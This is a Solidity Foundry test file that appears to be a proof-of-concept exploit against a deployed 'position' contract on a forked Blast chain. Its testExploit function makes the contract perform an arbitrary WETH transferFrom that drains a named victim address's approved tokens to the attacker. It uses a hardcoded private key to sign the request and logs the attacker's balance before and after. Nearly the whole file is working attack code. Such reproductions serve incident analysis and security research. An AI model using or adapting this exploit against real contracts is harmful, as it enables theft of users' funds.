// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC20.sol";

interface Iposition {
    struct FunctionCallData {
        address to;
        uint256 value;
        bytes data;
    }

    struct OpenPositionRequest {
        uint256 id;
        address currency;
        address targetCurrency;
        uint256 downPayment;
        uint256 principal;
        uint256 minTargetAmount;
        uint256 expiration;
        uint256 fee;
        FunctionCallData[] functionCallDataList;
    }

    function openPosition(
        OpenPositionRequest calldata _request,
        Signature calldata _signature
    ) external payable;

    struct Signature {
        uint8 v;
        bytes32 r;
        bytes32 s;
    }
}

contract positionTest is Test {
    Iposition position = Iposition(0x0301079DaBdC9A2c70b856B2C51ACa02bAc10c3a);
    IERC20 weth = IERC20(0x4300000000000000000000000000000000000004);
    address private vic = 0x5C629f8C0B5368F523C85bFe79d2A8EFB64fB0c8;
    address private attacker = msg.sender;
    uint256 signmsg;
    IERC20 juice = IERC20(0x4300000000000000000000000000000000000003);

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/blast", 6343272);
        uint256 atkpk = 0x9f466206919eb847d867b58671c1b2adc14ffbd4711669b01796357b826d5ca8;
        attacker = vm.addr(atkpk);
        signmsg = atkpk;
        deal(address(weth), address(this), 20 ether);
    }

    function testExploit() public {
        emit log_named_uint("Before exploit, WETH balance of attacker:", weth.balanceOf(address(this)));
        // uint256 allowance = weth.allowance(vic, address(position));
        // uint256 balance = weth.balanceOf(vic);
        // uint256 amuntToDrain = balance < allowance ? balance : allowance;

        bytes memory transdata = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)", 
            vic, 
            address(this), 
            128_000_000_000_000_000
        );

        Iposition.FunctionCallData[] memory FunctionCallData = new Iposition.FunctionCallData[](1);

        FunctionCallData[0] = Iposition.FunctionCallData({
            to: address(weth),   
            value: 0,        
            data: transdata 
        });

        Iposition.OpenPositionRequest memory request = Iposition.OpenPositionRequest({
            id: 1,
            currency: address(juice),
            targetCurrency: address(weth),
            downPayment: 0,
            principal: 0,
            minTargetAmount: 0,
            expiration: block.timestamp + 1 days,
            fee: 0,
            functionCallDataList: FunctionCallData
        });

        bytes32 messageHash = keccak256(abi.encodePacked(
            "\x19Ethereum Signed Message:\n32",
            keccak256(abi.encode(request))
        ));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signmsg, messageHash);

        Iposition.Signature memory signature = Iposition.Signature({
            v: v,
            r: r,
            s: s
        });
        bytes memory rawCalldata = abi.encodeWithSelector(
            position.openPosition.selector, 
            request, 
            signature
        );

        // Emit the raw calldata so it can be viewed in the logs
        emit log_named_bytes("Raw calldata for openPosition:", rawCalldata);

        Iposition(position).openPosition{value: 0}(request, signature);

        emit log_named_uint("After exploit, WETH balance of attacker:", weth.balanceOf(address(this)));
    }
}
